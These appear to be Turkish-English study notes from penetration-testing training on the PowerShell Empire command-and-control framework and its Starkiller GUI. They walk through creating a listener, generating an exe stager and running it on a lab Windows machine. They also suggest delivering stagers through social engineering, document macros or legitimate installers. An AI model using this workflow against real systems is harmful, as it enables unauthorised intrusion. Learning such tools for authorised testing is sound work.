### Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.
+ PowerShell Empire recently received an update and is now officially support and maintained by Kali Linux, more information regarding the update can be found here:
https://www.kali.org/blog/empire-starkiller/

+ In addition to being updated and modernized, BC Security, the company responsible for maintaining the Empire has also developed a companion to Empire called Starkiller.
### #Starkiller is a GUI Frontend for the Powershell Empire. 
#### Bu #powershell-empire 'ın grafik user interface olarak kullanılan versiyonu fark yok.

It is an Electron application written in VueJS and provides users with an intuitive way of interacting with Empire.
+ In order to get an understanding of how Empire works and the components that make up the framework, I would recommend going through the official documentation which can be found here: 
#### https://www.powershellempire.com/
+ #PowerShell-Empire & #Starkiller are both available as packages in the Kali Linux repositories.

---
## Aslında temel olarak metasploit framework'e benziyor ama farklılık nedir.
### 1. Msfconsole bir pentest'in veya gerçek bir hacker attack'ın bütün safhalarını yapabiliyor. Enumeration ile başlayıp , persistance'ye ve oradan da hash dump'A kadar herseyi yapabiliyorsun.
##### 2.  Msfconsole Linux, Windows, Unix, MacOs, BSD ve web app'lerde (PHP, JSP, ASP ....etc.) hepsinde kullanılabiliyor. 
![[Pasted image 20240401225610.png]]
## 3. #powershell-empire özellikle exploitation ve post exploitation bölümüne odaklanır.
### 4. İsiminden de açık olduğu üzere windows hedeflere karşı kullanılır.

#### <span style="background:#d4b106">Bu daha advanced bir framework olarak görülür ve Windows'un COMMAND AND CONTROL SERVER' ü olarak kabul edilir.</span>

### Bunu biraz daha RED-Team ciler daha çok kullanıyor.

---
![[Pasted image 20240401231350.png]]
![[Pasted image 20240401231425.png]]

![[Pasted image 20240401230747.png]]
### http://localhost:1337/index.html#/
![[Pasted image 20240401230805.png]]
### password123

listeners
callback agents
plugins

---
![[Pasted image 20240401231643.png]]
### <span style="background:#d4b106">Agents</span>: 0 --->> Erişim sağladığın HEDEF SİSTEM

### <span style="background:#d4b106">Listeners :</span> Hedeften Reverse shell almak için açtığın dinleyici sayısı netcat/multihandler vb.

### <span style="background:#d4b106">Plugin:</span> Kullanılacak eklentiler

---

### powershell-empire client

![[Pasted image 20240401232050.png]]
![[Pasted image 20240401232210.png]]
![[Pasted image 20240401232130.png]]

### listeners / agents
![[Pasted image 20240401232302.png]]

### Burası #powershell-empire normal msfconsole gibi framework olanı starkiller ise GUI 'si
## İster terminalden istersen de tool sepetinden açabilirsin
![[Pasted image 20240401232426.png]]

![[Pasted image 20240401232835.png]]
### Settings de bütün datayı sıfırlama modulu var birşeyler ters giderse kullanılabilir.
## Plugins
![[Pasted image 20240401233035.png]]
### reverseshell_stager_server - Server for reverseshell using msfvenom to act as a stage 0
![[Pasted image 20240401233415.png]]

### CsharpServer plugin'i ile stager c# ile yapabiliriz. Bunun output'u bir exe olacaktır ve windows'ta çalıştırılabilecektir.
### Stager'da zaralı bir kod bütünüdür hedefe erişim sağlamamıza ve komut çalıştırmamıza yarayan.

![[Pasted image 20240401233924.png]]
![[Pasted image 20240401234005.png]]

---
##### Reporting 
![[Pasted image 20240401234107.png]]
##### Yaptığımız işlemleri raporlamamıza yarar

---
### Credentials
##### Hedeften alınan credentials'ı gösterir veya kendi Credential'sımızı oluşturabilmemize imkan sağlar.

![[Pasted image 20240401234251.png]]

---
### Modules
![[Pasted image 20240401234419.png]]
##### 412 tane kullanılabilecek module var.

### Bunların çoğu windows post exploitation module'leridir.

## Örnek : csharp_sharpsploit.lateralmovement_wmigrunt
![[Pasted image 20240401234819.png]]

## Search : persistence
#### Show ID açık olmalı
![[Pasted image 20240401235037.png]]
### Birkaç tane IOS veya Unix Linux için de module var ama temelde windows için moduller.

---

## Yan tarafta Technique ID'ler var bunlar kullanılan attack çeşidinin MITRE ATTACK Framework'deki id numaralarını gösterir.
![[Pasted image 20240401235238.png]]

---

### Stager Bolumu bizim msfvenom'da payload yazdırmamız gibi.

## Bunu stager bölümünde oluşturuyoruz ve hedef sistemde execute edilmesi gerekir ki bizim açtığımız listener'a shell versin.
### Hedefte bu stager çalıştırılması sana kalmış.
### 1. Social Enigineering
### 2. Documents'lerin içine gömebilirsin bu bu stager'ları -Macro Moduna özelikle
## 3. legitimate executables içine de gömebilirsin. Winzip - Winrar gibi


---

### #powershell-empire KULLANIMI

## 1. Önce bir tane listener oluşturuyoruz.
#### Type : http
### port + kendi IP numaramız belirlendi

## Bu arada powershell-empire encrypted olarak çalışıyor ve en önemli özelliklerinde biri de bu.

![[Pasted image 20240402000442.png]]

## SUBMIT DEDIK VE
![[Pasted image 20240402000541.png]]
![[Pasted image 20240402000613.png]]

---
## 2. AŞAMA STAGER OLUŞTURMA
### burada biz stager 'ı CSHARP ile exe üreten olarak seçtik
## listener http
## isimleri de istediğimizi ayarladık.

## Download butonuna basıp şimdi biz bunu downloadsa indi--->>> ejpt klasörüne ekliyoruz.

![[Pasted image 20240402001424.png]]

### 3. karşı tarafa gönderdik çalıştırdık
![[Pasted image 20240402003646.png]]
![[Pasted image 20240402003956.png]]
![[Pasted image 20240402011344.png]]
### Bizim denemede win7 de sorun çıktı bizde metasploitable  windowsta denedik oldu.

---

### Aldığımız bağlantının adını değiştirmeliyiz ki sorun çıkmasın.
![[Pasted image 20240402004103.png]]

### File Browser'dan istediğimizi klasörü görsel olarak erişebiliriz.

![[Pasted image 20240402004222.png]]

### Dejavantaj olarak yazdığın komutlar real time olarak geri donmuyor meterpreter gibi.

---


